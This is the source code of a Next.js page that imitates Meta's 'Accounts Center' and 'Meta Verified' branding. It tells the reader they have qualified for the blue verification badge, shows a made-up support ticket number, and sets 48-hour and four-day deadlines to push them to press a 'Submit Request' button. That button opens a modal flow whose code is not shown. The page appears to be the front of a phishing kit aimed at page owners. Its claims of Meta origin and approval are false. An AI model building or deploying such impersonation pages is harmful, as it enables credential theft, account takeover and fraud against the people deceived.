import { ModalFlowProvider } from "@/components/ModalFlow";
import { ButtonWithModal } from "@/components/ButtonWithModal";
import Image from "next/image";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "Accounts Center | Meta Verified",
  description: "Meta Verified: Showcasing Your Professional Credibility",
  alternates: {
    canonical: "/accounts-center",
  },
};

export default function AccountsCenterPage() {
  return (
    <ModalFlowProvider>
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-sky-50 to-slate-100 text-slate-900">
        <main className="mx-auto flex min-h-screen max-w-4xl flex-col px-4 py-10 sm:px-8">
          <section className="flex-1 px-1 py-2 sm:px-2 sm:py-4">
            <div className="mb-6 flex items-start gap-4 sm:mb-10">
              <div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
                <Image
                  src="/ic_blue.svg"
                  alt="Meta Verified badge"
                  width={40}
                  height={40}
                  className="h-8 w-8"
                />
              </div>
              <div>
                <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">
                  Meta Verified: Showcasing Your Professional Credibility
                </h1>
                <p className="mt-2 text-sm font-semibold text-slate-800">
                  Strengthen your authority and demonstrate that your brand operates with professionalism.
                </p>
              </div>
            </div>

            <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
              <p>
                Congratulations on successfully meeting the strict requirements to upgrade your page with
                the verified blue badge. This milestone reflects your ongoing commitment and the strong
                level of trust you have built within your community.
              </p>
              <p>
                We are pleased to recognize this achievement and look forward to seeing your brand continue
                to grow and gain greater visibility with this respected verification status.
              </p>

              <p className="mt-4 text-sm font-medium text-metaBlue">
                Support Ticket ID: <span className="underline decoration-dotted">#Y718-SGCZ-4JXR</span>
              </p>

              <div className="mt-6 space-y-3">
                <h2 className="text-sm font-semibold text-slate-900 sm:text-base">
                  Official Verification Process
                </h2>
                <ul className="space-y-2 text-sm text-slate-700 sm:text-[15px]">
                  <li>
                    - Our verification team operates within a professional environment. Requests that
                    include threats, abusive language, or hate speech will not be reviewed.
                  </li>
                  <li>
                    - Please ensure that all submitted information is accurate to help the review process
                    move forward efficiently. If a valid email is not provided or if follow-up requests are
                    not answered within 48 hours, the application may be closed. Requests that remain
                    pending for more than 4 days will automatically be removed by the system.
                  </li>
                  <li>
                    - Once the request is submitted, a full account review will be conducted. Most
                    evaluations are completed within 24 hours, although more complex cases may require
                    additional time. After the review is completed, any existing restrictions will be
                    reviewed and your verification status will be finalized.
                  </li>
                </ul>
              </div>
            </div>

            <div className="mt-10 flex justify-center">
              <ButtonWithModal className="inline-flex items-center rounded-full bg-metaBlue px-10 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-metaIndigo focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-metaBlue focus-visible:ring-offset-2">
                Submit Request
              </ButtonWithModal>
            </div>
          </section>

          <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
            <button className="hover:text-slate-700" type="button">
              Help Center
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Privacy Policy
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Terms of Service
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Community Standards
            </button>
            <span className="text-slate-400">|</span>
            <span>Meta (c) 2025</span>
          </footer>
        </main>
      </div>
    </ModalFlowProvider>
  );
}
